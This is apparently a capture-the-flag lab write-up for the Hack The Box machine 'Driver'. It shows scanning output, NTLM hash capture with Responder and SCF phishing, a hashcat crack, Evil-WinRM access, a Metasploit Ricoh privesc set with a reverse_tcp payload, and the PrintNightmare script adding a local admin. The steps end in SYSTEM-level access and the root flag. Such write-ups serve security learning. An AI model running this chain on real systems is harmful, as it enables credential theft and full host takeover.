

- Things learnt
	- SCF files can be used to phish for hashes
	- always recheck your notes saif on previous enumeration
		-  This is regarding the print nightmare possibility
		- If one thing doesnt work it doesnt mean succumb to tunnel vision on it move to the other thing that you have in ur notes
- Things i will read about
	- Learn and understand what printnightmare is
	- Learn about ricoh driver exploit
		- Interactive services learn about that
	- Phishing with SCF files



``` 
kali@kali ~> nmap -sC -sV 10.10.11.106
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 05:49 EDT
Nmap scan report for 10.10.11.106
Host is up (0.063s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-07-18T16:49:34
|_  start_date: 2024-07-18T16:46:47
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.66 seconds

```

```
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
kali@kali ~> autorecon 10.10.11.106
[*] Scanning target 10.10.11.106
[!] [10.10.11.106/top-100-udp-ports] UDP scan requires AutoRecon be run with root privileges.
[*] [10.10.11.106/all-tcp-ports] Discovered open port tcp/80 on 10.10.11.106
[*] [10.10.11.106/all-tcp-ports] Discovered open port tcp/135 on 10.10.11.106
[*] [10.10.11.106/all-tcp-ports] Discovered open port tcp/445 on 10.10.11.106
[*] [10.10.11.106/all-tcp-ports] Discovered open port tcp/5985 on 10.10.11.106
```



```
kali@kali ~> dirsearch -u http://10.10.11.106

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_10.10.11.106/_24-07-18_06-47-25.txt

Target: http://10.10.11.106/

[06:47:25] Starting:
[06:47:26] 403 -  312B  - /%2e%2e//google.com
[06:47:27] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[06:47:36] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[06:47:47] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[06:47:55] 301 -  150B  - /images  ->  http://10.10.11.106/images/
[06:47:55] 403 -    1KB - /images/

Task Completed
```



https://github.com/cube0x0/CVE-2021-1675/tree/main

```
kali@kali ~> rpcdump.py @10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

so it is vulnerable




actually getting foothold was kind of cancer, because it was a knowledge check of smth ive never seen before

```
kali@kali ~> sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.30]
    Responder IPv6             [dead:beef:2::101c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TG407M6AZRA]
    Responder Domain Name      [6Z24.LOCAL]
    Responder DCE-RPC Port     [48682]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:5536c92a273de674:93BFE520A413D0072374442EDCCFEB2F:01010000000000000031811DE4D8DA017A88EDDA29A0555E000000000200080036005A003200340001001E00570049004E002D00540047003400300037004D00360041005A005200410004003400570049004E002D00540047003400300037004D00360041005A00520041002E0036005A00320034002E004C004F00430041004C000300140036005A00320034002E004C004F00430041004C000500140036005A00320034002E004C004F00430041004C00070008000031811DE4D8DA01060004000200000008003000300000000000000000000000002000003CAF7E87F8554A47638DA8E76C0E716CA3A77386C6459A672797A7FB21909ED40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003000000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony
[*] Skipping previously captured hash for DRIVER\tony


```


```
PS D:\hashcat-6.2.6> .\hashcat.exe -m 5600 tony.txt rockyou.txt -O -D
D:\hashcat-6.2.6\hashcat.exe: option requires an argument -- D
Invalid argument specified.

PS D:\hashcat-6.2.6> .\hashcat.exe -m 5600 tony.txt rockyou.txt -O -D  2
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3444.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

TONY::DRIVER:5536c92a273de674:93bfe520a413d0072374442edccfeb2f:01010000000000000031811de4d8da017a88edda29a0555e000000000200080036005                                                                                                           5a003200340001001e00570049004e002d00540047003400300037004d00360041005a005200410004003400570049004e002d00540047003400300037004d0036004                                                                                                           41005a00520041002e0036005a00320034002e004c004f00430041004c000300140036005a00320034002e004c004f00430041004c000500140036005a00320034002                                                                                                           2e004c004f00430041004c00070008000031811de4d8da01060004000200000008003000300000000000000000000000002000003caf7e87f8554a47638da8e76c0e7                                                                                                           716ca3a77386c6459a672797a7fb21909ed40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e0031003                                                                                                           34002e0033003000000000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:5536c92a273de674:93bfe520a413d00723744...000000
Time.Started.....: Thu Jul 18 14:32:41 2024 (0 secs)
Time.Estimated...: Thu Jul 18 14:32:41 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.9 MH/s (1.34ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 917541/14344384 (6.40%)
Rejected.........: 37/917541 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> jallah
Hardware.Mon.#1..: Temp: 55c Fan: 55% Util: 28% Core:1558MHz Mem:1740MHz Bus:8

Started: Thu Jul 18 14:32:36 2024
Stopped: Thu Jul 18 14:32:42 2024
```



`tony:liltony`



```
*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PsREADline> Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"


    Directory: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/28/2021  12:06 PM            134 ConsoleHost_history.txt


```

```
*Evil-WinRM* PS C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PsREADline> type ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1

```


```
msf6 exploit(multi/handler) > use windows/local/ricoh_driver_privesc
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ricoh_driver_privesc) > help

```




## Unintended path

https://github.com/JohnHammond/CVE-2021-34527

```shell
Import-Module .\cve-2021-34527.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default

Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure" 
```

```
*Evil-WinRM* PS C:\Users\tony\Documents\CVE-2021-34527> PowerShell -ExecutionPolicy Bypass -Command ". .\CVE-2021-34527.ps1; Invoke-Nightmare"
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

```


```
kali@kali ~> smbexec.py driver.htb/adm1n:P@ssw0rd@10.10.11.106
Impacket v0.11.0 - Copyright 2023 Fortra

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>cd ..
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is DB41-39A3

 Directory of C:\Users\Administrator\Desktop

06/12/2021  04:37 AM    <DIR>          .
06/12/2021  04:37 AM    <DIR>          ..
07/18/2024  12:28 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,180,319,232 bytes free

C:\Windows\system32>type c:\Users\Administrator\Desktop\root.txt
8e688b779ff35f45ad1995479dd30923

```